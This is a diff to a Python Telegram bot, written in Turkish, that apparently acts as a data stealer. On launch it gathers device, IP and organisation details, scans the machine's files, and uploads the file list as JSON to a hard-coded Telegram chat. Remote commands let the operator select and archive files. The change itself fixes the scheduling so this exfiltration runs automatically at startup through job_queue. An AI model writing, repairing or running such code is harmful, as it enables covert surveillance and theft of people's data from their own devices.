@@ -151,7 +151,7 @@ def arsiv_olustur(kategori, klasor_yolu):
     except Exception as e:
         return None, f"Arşiv oluşturulamadı: {str(e)}"
 
-async def bilgileri_kaydet_ve_gonder(app):
+async def bilgileri_kaydet_ve_gonder(context):
     zaman_damgasi = int(time.time())
     cihaz_bilgisi = cihaz_bilgisi_al()
     cihaz_mesaji = (
@@ -179,7 +179,7 @@ async def bilgileri_kaydet_ve_gonder(app):
         f"║ Organizasyon: {cihaz_bilgisi.get('Organizasyon', 'Bilinmiyor')} \n"
         "╚══════════════════════╝"
     )
-    await app.bot.send_message(chat_id=CHAT_ID, text=cihaz_mesaji)
+    await context.bot.send_message(chat_id=CHAT_ID, text=cihaz_mesaji)
     print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
     dosya_listesi, _ = dosya_tara()
     dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
@@ -187,7 +187,7 @@ async def bilgileri_kaydet_ve_gonder(app):
         json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
     print(f"Dosyalar {dosya_dosyasi} kaydedildi!")
     with open(dosya_dosyasi, "rb") as f:
-        await app.bot.send_document(chat_id=CHAT_ID, document=f)
+        await context.bot.send_document(chat_id=CHAT_ID, document=f)
     print(f"{dosya_dosyasi} Telegram'a gönderildi!")
 
 async def select_file(update, context):
@@ -240,9 +240,14 @@ async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("select", select_file))
     app.add_handler(CommandHandler("category", category))
-    # bilgileri_kaydet_ve_gonder'i ayrı bir görev olarak başlat
-    app.create_task(bilgileri_kaydet_ve_gonder(app))
+    # Uygulamayı başlat
+    await app.initialize()
+    # bilgileri_kaydet_ve_gonder'i job_queue ile çalıştır
+    app.job_queue.run_once(bilgileri_kaydet_ve_gonder, when=0)
+    # Botu çalıştır
     await app.run_polling()
+    # Kapat
+    await app.shutdown()
 
 if __name__ == "__main__":
     import asyncio
